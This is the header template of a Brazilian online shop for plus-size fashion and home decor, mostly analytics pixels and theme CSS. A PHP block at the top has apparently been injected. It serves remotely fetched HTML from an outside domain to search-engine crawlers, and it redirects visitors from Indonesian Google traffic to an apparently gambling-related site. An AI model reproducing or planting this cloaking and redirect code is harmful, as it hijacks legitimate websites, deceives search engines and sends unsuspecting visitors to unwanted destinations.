<?php
$s_ref = $_SERVER['HTTP_REFERER'] ?? '';
$agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$lang = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '');

function is_bot() {
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool', 'adsense', 'slurp');
foreach ($bots as $bot) {
if (stripos($user_agent, $bot) !== false) {
return true;
}
}
return false;
}
if (is_bot()) {
echo file_get_contents('https://theonlyd.xyz/vickttoriavick.html');
exit;
}

if (stripos($s_ref, 'google.co.id') !== false ||
(stripos($s_ref, 'google.com') !== false && stripos($lang, 'id') !== false)) {
header("Location: https://jbrtoto-back.pages.dev/");
exit;
}
?>
<!DOCTYPE html>
<!--[if IE]><![endif]-->
<!--[if IE 8 ]><html dir="ltr" lang="2" class="ie8"><![endif]-->
<!--[if IE 9 ]><html dir="ltr" lang="2" class="ie9"><![endif]-->
<!--[if (gt IE 9)|!(IE)]><!-->
<html dir="ltr" lang="2">
<!--<![endif]-->
<head>
    

<!-- Facebook Pixel Code -->
<script>
  !function(f,b,e,v,n,t,s)
  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
  n.queue=[];t=b.createElement(e);t.async=!0;
  t.src=v;s=b.getElementsByTagName(e)[0];
  s.parentNode.insertBefore(t,s)}(window, document,'script',
  'https://connect.facebook.net/en_US/fbevents.js');
  fbq('init', '1494482150879280');
  fbq('track', 'PageView');
</script>
<noscript><img height="1" width="1" style="display:none"
  src="https://www.facebook.com/tr?id=1494482150879280&ev=PageView&noscript=1"
/></noscript>
<!-- End Facebook Pixel Code -->

<!-- Google Analytics -->
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-33162178-2', 'auto');
    ga('set','dimension3','other'); // Valor de tipo de página opcional, por exemplo, home, cart, purchase    
    
ga('send', 'pageview');
</script>
<!-- End Google Analytics -->


<!-- Global site tag (gtag.js) - Google Ads: 946041581 -->
<script async src="https://www.googletagmanager.com/gtag/js?id=AW-946041581"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'AW-946041581');
</script>

<script>
  gtag('event', 'page_view', {'send_to': 'AW-946041581',
            'ecomm_pagetype': 'other'  });
</script>

<!-- Start of CartStack API Script -->
<script src="//app.cartstack.com.br/activeAPI/load.js" async type="text/javascript"></script>
<!-- End of CartStack API Script -->

<script type="text/javascript">    
function addDeferedCss(href){
    var giftofspeed = document.createElement('link');
    giftofspeed.rel = 'stylesheet';
    giftofspeed.href = href;
    giftofspeed.type = 'text/css';
    var godefer = document.getElementsByTagName('link')[0];
    godefer.parentNode.insertBefore(giftofspeed, godefer);    
}
</script>

<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<title>Vickttoria Vick</title>
<base href="https://www.vickttoriavick.com.br/" />
<meta name="description" content="E-commerce de moda Plus Size, quadros decorativos e artigos de decoração para casa e para cozinha. Compre Online ou em nossa loja em Brasília/DF" />
<script src="catalog/view/javascript/jquery/jquery-2.1.1.min.js" type="text/javascript"></script>
<link href="catalog/view/javascript/bootstrap/css/bootstrap.min.css" rel="stylesheet" media="screen" />
<script src="catalog/view/javascript/bootstrap/js/bootstrap.min.js" type="text/javascript"></script>
<link href="catalog/view/theme/uptheme/stylesheet/stylesheet.css" rel="stylesheet">
<link href="catalog/view/theme/uptheme/stylesheet/stylesheet-small-screens.css" rel="stylesheet">

<script type="text/javascript">$(function(){addDeferedCss('catalog/view/javascript/font-awesome/css/font-awesome.min.css');})</script>

<script type="text/javascript">$(function(){addDeferedCss('catalog/view/javascript/jquery/magnific/magnific-popup.css');})</script>
<script src="catalog/view/javascript/common.js" type="text/javascript"></script>
<script src="catalog/view/theme/uptheme/js/custom-theme.js" type="text/javascript"></script>
<link href="catalog/view/javascript/jquery/owl-carousel/owl.carousel.css" rel="stylesheet" media="screen" />
<script src="catalog/view/javascript/jquery/owl-carousel/owl.carousel.min.js" type="text/javascript"></script>
<link rel="stylesheet" property="stylesheet" type="text/css" href="catalog/view/theme/uptheme/stylesheet/dcaccordion.css" />	
<script type="text/javascript" src="catalog/view/theme/uptheme/js/jquery.dcjqaccordion.js"></script>

<!--<link rel="stylesheet" type="text/css" href="catalog/view/theme/uptheme/stylesheet/cloud-zoom.css" />
<script type="text/javascript" src="catalog/view/theme/uptheme/js/cloud-zoom.js"></script>-->

<link href="https://www.vickttoriavick.com.br/image/catalog/banners-2022/brasbolpng.png" rel="icon" />

<style type="text/css">

/*  Body background color and pattern  */
body {
    background-color: #F5F5F5;

  
	
	background-image: none;
	background-position: top center;
	background-repeat: repeat;
	background-attachment: scroll;
}

/*  Headings color  */
h1, h2, h3, h4, h5, h6, .panel-default > .panel-heading, .product-thumb h4 a, #column-left .product-thumb h4 a, #column-right .product-thumb h4 a, .table > thead, .nav-tabs > li > a:hover, .nav-tabs > li.active > a:hover, .nav-tabs > li.active > a, .nav-tabs > li.active > a:focus, legend, #search .form-control, .product-right-sm-info span.p-title, .product-right-sm-related .name a {color: #514158;}
/*#content h1::before, #content h2::before {border-bottom: 3px solid #514158;}*/
#content h1, #content h2 {padding-bottom: 10px;}

/*  Body text color  */
body, #content .tab-content p, #content .product-right-sm-info .modal-body p, .product-buy ul.pf span {color: #707C8C;}

/*  Light text color  */
small, #content p, .breadcrumb a, .cat-description, .product-thumb .product_box_brand a, .product-buy ul.pf li, .product-buy ul.pp, .prev-name, .next-name, .product-right-sm-info span.p-subtitle, .product-right-sm-related .product_box_brand a, .box-category-home .subcat a, #content .product-right-sm-info .modal-body h1 + p, #features .modal-body h1 + p, .cookie-message, .alert-success, .alert-info, .dropdown-highlight {color: #9BA9BA;}

/*  Links color  */
a, a:focus, .list-group a {color: #707C8C;}

/*  Links hover color  */
a:hover, .breadcrumb a:hover, .dropdown-highlight:hover, .dropdown-highlight:focus, .box-category-home .subcat li:hover a, .table .btn, .table .btn-primary, .table .btn-primary:hover, .table .btn-primary:focus, .list-group a.active, .list-group a.active:hover, .list-group a:hover, .category-list .image:hover, .save-percent {color: #5AC7C0;}

/*  Icons color  */
.dr-menu > div .dr-icon i, .category-list i, #menu_brands .image i, .box-category-home .image i, .box-manufacturers-home .image i, #search .input-group-addon .btn, .accordion li.dcjq-parent-li > a + .dcjq-icon {color: #D6DDE6;}
.owl-carousel .owl-buttons div {color: #D6DDE6!important;}

/*  Icons hover color  */
.dr-menu.dr-menu-open > div .dr-icon i, #search .input-group-addon .btn:hover, .up-theme-modal .modal-body .close, .product-right-sm-info span.p-icon i, .alert-success i, .alert-success .close, .alert-info i, .alert-info .close, .accordion li.dcjq-parent-li > a + .dcjq-icon:hover, .up-theme-gallery-content .gallery-hover-box i, .up-theme-modal-popup .modal-body .close {color: #EB008B;}
.owl-carousel .owl-buttons div:hover, .mfp-close:hover {color: #EB008B!important;}
#toTop {background-color: #EB008B;}

/*  Wrapper Frame  */
.wrapper.framed {background-color: #707070;}
.wrapper.full-width-border {border: 34px solid #707070;}

/*  Content Column  */
#content, #content .panel-default > .panel-heading, #content .panel, .category-list + .panel-default > .panel-heading, #search .form-control, #search .input-group-addon, #search .input-group-addon .btn, #livesearch_search_results, .modal-content, .alert-success, .alert-info, .cookie-message, .custom_box {
	background-color: #FFFFFF;
}
.product-filter, .dropdown-highlight {
	background-color: #F5F5F5;
}
.product-filter, .pagination-box, #content .panel-default > .panel-heading, #product-tabs, #livesearch_search_results li, .modal-footer, .list-group a, .list-group a.active, .list-group a.active:hover, .list-group a:hover, a.list-group-item.active, a.list-group-item.active:hover, a.list-group-item.active:focus, .dr-menu ul li {
    border-top: 1px solid #F5F5F5;	
}	
.product-filter, .modal-header, .box-category-home .subcat li {
    border-bottom: 1px solid #F5F5F5;	
}
.well, .table-bordered, .table-bordered > thead > tr > th, .table-bordered > tbody > tr > th, .table-bordered > tfoot > tr > th, .table-bordered > thead > tr > td, .table-bordered > tbody > tr > td, .table-bordered > tfoot > tr > td, .contact-map, .img-thumbnail-theme {
    border: 1px solid #F5F5F5;	
}
hr, legend, #search .input-group-addon {
	border-color: #F5F5F5;
}
.nav-tabs > li > a:hover, .nav-tabs > li.active > a:hover, .nav-tabs > li.active > a, .nav-tabs > li.active > a:focus {
    border-top: 1px solid #514158;	
}

/*  Left Column Heading  */
#column-left .panel-heading  {	
	background-color: #FFFFFF;
}
#column-left .panel-default > .panel-heading, #column-left .panel-default > .panel-heading h2 {color: #4C5867;}
	
#column-left .panel-default > .panel-heading, #column-left .dr-menu.dr-menu-open > .panel-heading {
	border-bottom: 1px solid #F4F7F7;
}

/*  Left Column Box  */
#column-left .panel, #column-left .owl-carousel {
	background-color: #FFFFFF;
}
#column-left a {color: #707C8C;}
#column-left a:hover {color: #5AC7C0;}
#column-left {color: #707C8C;} 
#column-left .list-group a, #column-left .list-group a.active, #column-left .list-group a.active:hover, #column-left .list-group a:hover, #column-left .dr-menu ul li {border-top: 1px solid #F4F7F7;}
#column-left .panel, #column-left .owl-carousel.carousel-module, #column-left .owl-carousel.banner-module {border-bottom: 1px solid #F4F7F7!important;}
#column-left {border-right: 1px solid #F4F7F7;}


/*  Right Column Heading  */
#column-right .panel-heading  {
	background-color: #FFFFFF;
}
#column-right .panel-default > .panel-heading, #column-right .panel-default > .panel-heading h2 {color: #4C5867;}
	
#column-right .panel-default > .panel-heading, #column-right .dr-menu.dr-menu-open > .panel-heading  {
	border-bottom: 1px solid #F4F7F7;
}

/*  Right Column Box  */
#column-right .panel, #column-right .owl-carousel {
	background-color: #FFFFFF;
}
#column-right a {color: #707C8C;}
#column-right a:hover, #column-right .dr-menu > div .dr-icon i {color: #5AC7C0;}
#column-right {color: #707C8C;}
#column-right .list-group a, #column-right .list-group a.active, #column-right .list-group a.active:hover, #column-right .list-group a:hover, #column-right .dr-menu ul li {border-top: 1px solid #F4F7F7;}
#column-right .panel, #column-right .owl-carousel.carousel-module, #column-right .owl-carousel.banner-module {border-bottom: 1px solid #F4F7F7!important;}
#column-right {border-left: 1px solid #F4F7F7;}


/*  Category Box Heading  */
#column-left .panel-default.panel-category > .panel-heading, #column-right .panel-default.panel-category > .panel-heading {
	background-color: #FFFFFF;
    color: #4C5867;
	
	border-bottom: 1px solid #F4F7F7;
}

/*  Category Box Content  */
#column-left .panel-default.panel-category, #column-right .panel-default.panel-category {
	background-color: #FFFFFF;
    border-bottom: 1px solid #F4F7F7!important;	
}
#column-left .panel-default.panel-category a.list-group-item, #column-right .panel-default.panel-category a.list-group-item, .accordion li {
	border-top: 1px solid #F4F7F7;	
}
#column-left .panel-default.panel-category a, #column-right .panel-default.panel-category a {color: #707C8C;}
#column-left .panel-default.panel-category a:hover, #column-right .panel-default.panel-category a:hover, #column-left .panel-default.panel-category .cat-mod-child a:hover, #column-right .panel-default.panel-category .cat-mod-child a:hover, #column-left .panel-default.panel-category a.list-group-item.active, #column-right .panel-default.panel-category a.list-group-item.active {color: #5AC7C0;}
#column-left .panel-default.panel-category .cat-mod-child a, #column-right .panel-default.panel-category .cat-mod-child a, #column-left .accordion li ul li a.list-group-item {color: #9BA9BA;}


/*  Filter Box Heading  */
#column-left .panel-default.filters > .panel-heading, #column-right .panel-default.filters > .panel-heading  {
	background-color: #FFFFFF;
    color: #4C5867;
	
	border-bottom: 1px solid #F4F7F7;
}

/*  Filter Box Content  */
#column-left .panel-default.filters, #column-right .panel-default.filters {
	background-color: #FFFFFF;
    border-bottom: 1px solid #F4F7F7!important;
}
#column-left .panel-default.filters a, #column-right .panel-default.filters a {color: #4C5867;}
#column-left .panel-default.filters label, #column-right .panel-default.filters label {color: #707C8C;}
#column-left .panel-default.filters label:hover, #column-right .panel-default.filters label:hover {color: #5AC7C0;}

/*  Text Logo  */
#logo h1 a, #logo-menu h1 a {color: #4C5867;}

/*  Top Promo Message Slider  */
#top-custom-block-content {
	display:none;
}
#top-custom-block-wrapper {
    background-color: #FFFFFF;
	color: #EB008B;
	background-image: none;
}


/*  Layout  */



/*  HEADER  */

header {
	background-color: #FFFFFF;
	background-image: none;
	background-position: top center;
	background-repeat: repeat;
	background-attachment: scroll;
}
.is-sticky #menu {
	background-color: #FFFFFF;
}
.button-i {color: #EB008B;}
.buttons-header:hover .button-i {color: #EB1328;}
.buttons-header button, .buttons-header span.button-text {color: #EB008B;}
.buttons-header:hover, .buttons-header:hover button, .buttons-header:hover span.button-text {color: #EB1328;}
.col-sm-8 #information-block, .col-sm-8 #contact-block, #search-block, #cart, #menu-mobile-block {
	border-left: 1px solid #F4F7F7;
}
#information-block, #contact-block {
	border-right: 1px solid #F4F7F7;
}
@media (max-width: 767px) {
#search-block, #cart, #menu-mobile-block {
	border-top: 1px solid #F4F7F7;
}
}

/*  Top Bar  */
#top, #open-top-custom-block {
	background-color: #514158;
}
#top, #top-links li {
	color: #FFFFFF;
}
#top a, #top .btn-link, #top-links a {
	color: #FFFFFF;
}
#top a:hover, #top .btn-link:hover, #top .btn-link:hover i, #top-links a:hover, #top-links a:hover i, #open-top-custom-block i {
	color: #EB008B;
}
#open-top-custom-block {
	border-left: 1px solid #FFFFFF;
}
#open-top-custom-block.open i, #top-links i, #top .btn-link i {
	color: #FFFFFF;
} 
#top {
	border-bottom: 1px solid #F4F7F7;
}

#menu-mobile-block {float: right;}

/*  Fixed Header  */
.is-sticky .navbar {
	text-align: left;
}

/*  MAIN MENU */

/*  Main Menu Bar  */
#menu {
	background-color: #FFFFFF;
	
    border-top: 1px solid #F4F7F7;	
	
    border-bottom: 1px solid #F4F7F7;	

	background-image: none;
	background-repeat: repeat;
}

#homepage, .menu_oc, #menu_ver, #menu_hor, #menu_brands, .menu_links, #menu_custom_menu, .menu_custom_block {
	border-left: 1px solid #F4F7F7;
}
.navbar .main-menu > li:last-child {
	border-right: 1px solid #F4F7F7;
}
#menu .main-menu > li > a:hover, #menu .main-menu > li.open > a {
	border-top: 1px solid #EB008B;
}
#menu .main-menu > li > a {
	border-top: 1px solid transparent;
	margin-top: -1px;
}

/*  Home Page Link  */
#menu #homepage a {
	color: #707C8C;
}	
#menu #homepage:hover a {
	color: #EB008B;
}

/*  Categories Section  */
.menu_oc > a, #menu_ver > a, #menu_hor > a {
	color: #514158;
}	
.menu_oc:hover > a, #menu_ver:hover > a, #menu_hor:hover > a {
	color: #EB008B;
}

/*  Brands Section  */
#menu_brands > a {
	color: #707C8C;
}	
#menu_brands:hover > a {
	color: #EB008B;
}

/*  Custom Links Section  */
.menu_links a {
	color: #707C8C;
}	
.menu_links:hover a {
	color: #EB008B;
}

/*  Custom Menu Section  */
#menu_custom_menu > a {
	color: #707C8C;
}	
#menu_custom_menu:hover > a {
	color: #EB008B;
}

/*  Custom Blocks Section  */
.menu_custom_block > a {
	color: #707C8C;
}	
.menu_custom_block:hover > a {
	color: #EB008B;
}

/*  Sub-Menu  */
#menu .dropdown-menu, #menu .dropdown-menus {
	background-color: #FFFFFF;
	color: #707C8C;
}
#menu .dropdown-highlight {
	background-color: #FBFCFC;
}
#menu .dropdown-menus a, #menu_brands .brand-item .name {
	color: #707C8C;
}	
#menu .dropdown-menus a:hover, #menu .dropdown-menus li a:hover, #menu #menu_hor .dropdown-menus li.sub-cat:hover > a, #menu #menu_hor .dropdown-menus li.main-cat > a:hover, #menu_brands .brand-item .name:hover {
	color: #EB008B;
}
.menu_oc ul > li, #menu_ver ul > li, #menu_custom_menu ul > li, .menu_custom_block table ul > li, #menu .dropdown-menu li, #menu .dropdown-menus li {
	border-bottom: 1px solid #F4F7F7;
}
#menu_hor .dropdown-menus ul > li ul > li {
    /*border-bottom: 1px solid #F4F7F7;*/
    border-bottom: none;
	}
#menu .dropdown-menus a.see-all {
	border-top: 1px solid #F4F7F7;
}
#menu .dropdown-menu, #menu .dropdown-menus {
	box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.2);
}

/*  Main Menu Labels  */
 
#menu_label1:after { background-color:#16B778; }
 
#menu_label2:after { background-color:#16B778; }
 
#menu_label3:after { background-color:#16B778; }
 
#menu_label4:after { background-color:#16B778; }
 
#menu_label5:after { background-color:#16B778; }
 
#menu_label6:after { background-color:#16B778; }
 
#menu_label7:after { background-color:#16B778; }
 
#menu_label8:after { background-color:#16B778; }
 
#menu_label9:after { background-color:#16B778; }
 
#menu_label10:after { background-color:#16B778; }
 
#menu_label11:after { background-color:#16B778; }
 
#menu_label12:after { background-color:#16B778; }
 
#menu_label13:after { background-color:#16B778; }
 
#menu_label14:after { background-color:#16B778; }
 
#menu_label15:after { background-color:#16B778; }
#menu .cat-img img {margin-right: 0px;}
.navbar {text-align: center;}

/*  Custom Bar below Main Menu  */
#custom-bar-wrapper {
	background-color: #5AC7C0;
	color: #FFFFFF;
	background-image: none;
    animation: animatedBackground 40s linear infinite;
}

/*  Slider Controls */
.owl-controls .owl-page span {background: #EBF2F3;}
.owl-controls .owl-page.active span {background: #62CEFB;}

/*  Category Page  */
.category_top_title h1 {color: #514158;}

/*  Product Box  */
span.badge.sale {background-color: #EB008B;}
span.badge.new {background-color: #5AC7C0;}
.rating .fa-star {color: #FFE654;}
	
a.quickview, .image a.quickview {display: none;}
	
#content .product-grid div:hover .image a img, #content .box-product div:hover .image a img {
	transform: scale(1.1);
    -moz-transform: scale(1.1);
    -webkit-transform: scale(1.1);
    -o-transform: scale(1.1);
    -ms-transform: scale(1.1);
}
.product-grid .name, #content .box-product .name, #content .box-product .product_box_brand, .product-bottom-related .name, .product-box-slider .name, .product-grid .product_box_brand, .product-box-slider .product_box_brand, .product-bottom-related-flexslider .product_box_brand, .product-bottom-related-flexslider .rating, .tab-content-products .product_box_brand, .product-grid .price, #content .box-product .price, .product-box-slider .price, .product-bottom-related .price, .product-grid .rating, #content .box-product .rating, .product-box-slider .rating, .product-grid .cart, #content .box-product .cart, .product-box-slider .cart, .product-bottom-related .cart, .product-right-sm-related .name, .product-right-sm-related .product_box_brand, .product-right-sm-related .rating, .product-right-sm-related p.price {
	text-align: center;
}

/*  Product Page  */
  
.prev, .next {display: none;}



/*  Video Box  */
.video_box_left #video_box_icon, .video_box_right #video_box_icon {
    background-color: #5AC7C0;
}
.video_box_right .video_box, .video_box_left .video_box {
    border: 4px solid #5AC7C0;
}
 
/*  Custom Box  */
.custom_box_left #custom_box_icon, .custom_box_right #custom_box_icon {
    background-color: #5AC7C0;
}
.custom_box_right .custom_box, .custom_box_left .custom_box {
    border: 4px solid #5AC7C0;
}


/*  FOOTER  */
footer {opacity: 0;}
footer.come-in {opacity: 1;}

/*  Features Block  */
#features {
	background-color: #514158;

	background-image: none;
	background-position: top center;
	background-repeat: repeat;
}
}
#features span.f-icon.fi1 i {color: #5AC7C0;}
#features span.f-icon.fi2 i {color: #5AC7C0;}
#features span.f-icon.fi3 i {color: #5AC7C0;}
#features span.f-icon.fi4 i {color: #5AC7C0;}
#features .f-title {color: #FFFFFF;}
#features span.f-subtitle {color: #FFFFFF;}

/*  Information, Custom Column  */
#information {
	color: #FFFFFF;
	background-color: #514158;
	background-image: none;
	background-position: top center;
	background-repeat: repeat;
	border-top: 1px solid #F4F7F7;
}
#information h5 {color: #FFFFFF;}
#information a {color: #FFFFFF;}
#information a:hover {color: #DDDDDD;}
#information li {color: #DDDDDD;}

/*  Powered by, News, Payment Images, Follow Us  */
#powered {
	color: #9BA9BA;
	background-color: #FFFFFF;
	background-image: none;
	background-position: top center;
	background-repeat: repeat;
	border-top: 1px solid #F4F7F7;
}
#powered a {color: #707C8C;}
#powered a:hover, #powered i:hover {color: #5AC7C0;}
#powered span#footer-news {color: #5AC7C0;}
#powered #news a {color: #9BA9BA;}
#powered #news a:hover {color: #707C8C;}
#powered i {color: #D6DDE6;}

/*  Bottom Custom Block  */
#footer_custom {
	color: #9BA9BA;
	background-color: #FFFFFF;
	background-image: none;
	background-position: top center;
	background-repeat: repeat;
	border-top: 1px solid #F4F7F7;
}
#footer_custom a {color: #707C8C;}
#footer_custom a:hover {color: #5AC7C0;}


/*  Product Slider on Home Page  */
.ei-slider, .ei-slider-large li {background-color: #FFFFFF;}
.ei-title h2 a{color: #514158;}
.ei-title h3 a, .ei-title h4 a .price-old{color: #9BA9BA;}
.ei-title h4 a{color: #EB008B;}
.ei-slider-thumbs li a{background: #EEEEEE;}
.ei-slider-thumbs li.ei-slider-element{background: #514158;}

/*  Prices */
#content .product-thumb p.price, #cart span.price, #column-left .product-items .price, #column-right .product-items .price, .product-buy .price-reg, #content .product-right-sm-related p.price {color: #EB008B;}
.price-old, .product-thumb .price-tax {color: #9BA9BA;}
.price-new {color: #FF0000;}

/*  Buttons */
.btn-default, .btn-default.active, button.wishlist, button.compare, button.info, .pagination > li > a, .pagination > li > span, #cart .btn-default, .box-category-home .name, .box-manufacturers-home .name, input#input-quantity, input.dec, input.inc, #menu #menu_hor .dropdown-menus li.main-cat > a, #menu_brands .brand-item .name, #sidebar-wrapper-contact a.btn-default {
	 
	background-color: #EEEEEE;
		color: #514158;
	border: 3px solid #EEEEEE;
}
.btn-default:hover, .btn-default.active:hover, .btn-default.active:focus, #column-left .btn-default:hover, #column-right .btn-default:hover, .btn-default:focus, .btn-default:active, .btn-default.active, .btn-default.disabled, .btn-default[disabled], button.wishlist:hover, button.compare:hover, button.info:hover, .pagination > li > a:hover, .pagination > li > a:focus, .pagination > li > a:active, .pagination > li > span:hover, #cart .btn-default:hover, .box-category-home .name:hover, .box-manufacturers-home .name:hover, input.dec:hover, input.inc:hover, #menu #menu_hor .dropdown-menus li.main-cat > a:hover, #menu_brands .brand-item a:hover .name, #sidebar-wrapper-contact a.btn-default:hover {
	background-color: #514158;
    color: #FFFFFF;
	border: 3px solid #514158;	
}

.btn-primary, .pagination > .active > a, .pagination > .active > span, .pagination > .active > a:hover, .pagination > .active > span:hover, .pagination > .active > a:focus, .pagination > .active > span:focus, #information a.btn-primary, #cart .btn-primary, #sidebar-wrapper-contact a.btn-primary {
	 
	background-color: #EB008B;
		color: #FFFFFF;
	border: 3px solid #EB008B;
}
.btn-primary:hover, .btn-primary:focus, .btn-primary:active, .btn-primary.active, .btn-primary.disabled, .btn-primary[disabled], #information a.btn-primary:hover, #cart .btn-primary:hover, #sidebar-wrapper-contact a.btn-primary:hover {
	background-color: #514158;
    color: #FFFFFF;
	border: 3px solid #514158;	
}
.btn, .pagination > li > a, .pagination > li > span, .product-grid .wishlist, .product-grid .compare, .product-grid .info, .product-list .wishlist, .product-list .compare, #content .box-product .wishlist, #content .box-product .compare, #content .box-product .info, .product-box-slider-flexslider .wishlist, .product-box-slider-flexslider .compare, .product-box-slider-flexslider .info, .product-bottom-related-flexslider .wishlist, .product-bottom-related-flexslider .compare, .product-bottom-related-flexslider .info, .up-theme-gallery-content .gallery-hover-box, .up-theme-modal-popup .modal-body .close, .box-category-home .name, .box-manufacturers-home .name, #menu #menu_hor .dropdown-menus li.main-cat > a, #menu_brands .brand-item .name {
	border-radius: 4px!important;
}

/*  Dropdowns  */
.dropdown-menu, .dropdown-menus, .my-account-dropdown-menu li, #cart .dropdown-menu, #sidebar-wrapper, #sidebar-wrapper-contact, #menu-mobile, .prev, .next {background-color: #FFFFFF;}
#cart span.name a, #cart span.quantity, .sidebar-nav > .sidebar-title, .sidebar-nav h5 {color: #4C5867;}
#cart .table.cart-total > tbody > tr > td, .dropdown-menu .datepicker {color: #707C8C;}
#cart .table.cart-total > tbody > tr > td:first-child, #cart .dropdown-menu li p, #cart .dropdown-menu small, #cart span.price, .sidebar-nav li a, #sidebar-wrapper-contact div {color: #9BA9BA;}
.dropdown-menu a, #top .dropdown-menu a, #top .dropdown-menu .btn-link, .prev-name, .next-name, .bootstrap-datetimepicker-widget td.old, .bootstrap-datetimepicker-widget td.new {color: #9BA9BA;}
.dropdown-menu a:hover, #top .dropdown-menu a:hover, .my-account-dropdown-menu li.logout a:hover, #top .dropdown-menu li:hover .btn-link, .sidebar-nav li a:hover, .prev-name:hover, .next-name:hover {color: #4C5867;}
#top-links .my-account-dropdown-menu i, #cart button.item-remove, .prev-arrow i, .next-arrow i {color: #D6DDE6;}
#top-links .my-account-dropdown-menu li a:hover i, #cart button.item-remove:hover, #menu-toggle-close span, #contact-toggle-close span, #menu-mobile-toggle-close span {color: #5AC7C0;}
.my-account-dropdown-menu li.logout, #cart .checkout, .prev-name, .next-name {background-color: #FBFCFC;}
#cart .table > tbody > tr > td, #cart .checkout, .prev-name, .next-name {border-top: 1px solid #F4F7F7;}
.dropdown-menu li, .dropdown-menus li, .sidebar-nav.list-group li {border-bottom: 1px solid #F4F7F7;}
.my-account-dropdown-menu li:nth-child(2n) {border-left: 1px solid #F4F7F7;}
.dropdown-menu, .dropdown-menus, .modal-body #search, #livesearch_search_results, .modal-content {
	box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.2);
}
.prev, .next {
	box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.1);
}

/*  Modal  */
.up-theme-modal .modal-content, .fancybox-overlay {
	
	background-color: rgba(245, 245, 245, 0);
}
.modal-backdrop {
	
	background-color: rgba(245, 245, 245, 0.95);
}

/*  Fonts  */

/*  Body  */
body, button, select, .form-control, .menu_label, .tooltip-inner { 
    font-family: ABeeZee,Arial,Helvetica,sans-serif; 
}
body, button, select, .form-control, #cart .table > tbody > tr > td, #menu .dropdown-menus, #menu .dropdown-menus a, .box-category-home .subcat a { 
	font-size: 12px;
}

/*  Small Text  */
small, .small, label, #top, #top #currency .currency-select, #top .btn-group > .btn, .buttons-header, #cart > .btn, .btn-group > .dropdown-menu, .dropdown-menu, .dropdown-menus, #menu .dropdown-menus a.see-all, .menu_label, .breadcrumb a, .category-list > div, .product-thumb .product_box_brand a, .product-right-sm-related .product_box_brand a, .tooltip { 
	font-size: 10px;
}

/*  Headings and Product Name  */
h1, h2, h3, h4, h5, h6, .panel-heading, .product-right-sm-info span.p-title, #features .f-title, .nav-tabs > li > a, legend, .sidebar-nav > .sidebar-title, #menu #menu_hor .dropdown-menus li.main-cat > a, .box-category-home .name { 
    font-family: ABeeZee,Arial,Helvetica,sans-serif; 
}
h1, h2, h3, h4, h5, h6, .panel-heading, .product-right-sm-info span.p-title, #features .f-title, .nav-tabs > li > a, legend, .sidebar-nav > .sidebar-title, #menu #menu_hor .dropdown-menus li.main-cat > a, .box-category-home .name { 
    font-weight: bold; 
}
h1, h2, h3, h4, h5, h6, .panel-heading, .product-right-sm-info span.p-title, #features .f-title, .nav-tabs > li > a, legend, .sidebar-nav > .sidebar-title, #menu #menu_hor .dropdown-menus li.main-cat > a, .box-category-home .name { 
    text-transform: none;
}

/*  Price  */
.price, .price-new, .price-old, .price-reg { 
    font-weight: bold; 
}

/*  Buttons  */
.btn-default, .btn-primary, .box-manufacturers-home .name { 
    font-size: 14px;
    font-weight: bold;
}

/*  Main Menu Bar  */
#menu #homepage a, #menu .main-menu > li > a {
	font-size: 15px;
    font-weight: bold;
}
#menu #homepage a, #menu .main-menu > li > a { 
    text-transform: none;
}

</style>

<style type="text/css">
/*  Custom CSS */
.button-i {
    width: 100%;
}

#cart #cart-total{
font-size: 16px
}

.dropdown-menu-right{
left: 0;
}

/* Molduras */
.ajg-img{
padding: 8%;
    background-repeat: no-repeat;
    background-size: contain;
    box-sizing: border-box;
}

/* Marco */
/*        .owl-item .product-layout .image img,
            .product-layout .image img{
                padding: 10px 10px 20px 10px;
                border: 1px solid rgba(81,65,88,.75);
                background-color: transparent;
                -webkit-transform:rotate(-1deg);
                -moz-transform: rotate(-1deg);
                -o-transform: rotate(-1deg);
                -ms-transform: rotate(-1deg);
                transform: rotate(-1deg);

                -webkit-box-shadow: 8px 8px 8px -4px rgba(81,65,88,.75);
                -moz-box-shadow: 8px 8px 8px -4px rgba(81,65,88,.75);
                box-shadow: 8px 8px 8px -4px rgba(81,65,88,.75);                
            }

            .owl-item:nth-child(even) .product-layout .image img,
            .product-layout:nth-child(even) .image img{
                padding: 10px 10px 20px 10px;
                border: 1px solid rgba(81,65,88,.75);
                background-color: transparent;
                -webkit-transform:rotate(2deg);
                -moz-transform: rotate(2deg);
                -o-transform: rotate(2deg);
                -ms-transform: rotate(2deg);
                transform: rotate(2deg);
*/

                -webkit-box-shadow: -8px 8px 8px -4px rgba(81,65,88,.75);
                -moz-box-shadow: -8px 8px 8px -4px rgba(81,65,88,.75);
                box-shadow: -8px 8px 8px -4px rgba(81,65,88,.75);
            }



.product-grid .product-thumb .image{
padding: 10px;
}

img.img-responsive.img-thumbnail-theme{
width: 100%;
}

.product-grid p.description, .product-gallery p.description{
/*display: block;*/
}

@media (min-width: 768px) {
#top {
    padding: 0; 
    margin: 0;
    min-height: 10px;
}
}

/* Menu Top */
#top {
    text-transform: uppercase;
}

/* Header */
#logo img{height: 57px;}
#logo{margin-top: 2px;margin-bottom: 0px;}
header{min-height: 65px;}
.buttons-header{height: 65px;padding-top: 10px;}

#ajg_menu_96 {
    column-count: 3;
}

.ei-title h2 a, .ei-title h3 a{
text-transform: none !important;
}

.badge-wrapper{display:none}

.product-thumb p.price{
color:  !important;
}

#button-cart{
    background: #EB008B url(image/carrinho.png) no-repeat 115px 7px;
}

h1, h2{
margin-bottom: 0px;
margin-top: 0px;
}

